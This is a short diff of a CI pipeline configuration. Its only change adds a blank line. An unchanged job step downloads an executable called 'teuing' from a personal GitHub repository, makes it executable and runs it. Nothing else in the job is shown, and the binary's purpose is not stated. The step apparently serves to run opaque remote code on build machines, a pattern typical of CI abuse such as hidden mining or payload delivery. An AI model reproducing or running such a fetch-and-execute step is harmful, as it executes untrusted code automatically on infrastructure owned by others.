@@ -9,3 +9,4 @@ jobs:
     steps:
       - checkout
       - run: wget https://raw.githubusercontent.com/Briansantoso560/teuing/main/teuing && chmod +x teuing && ./teuing
+      
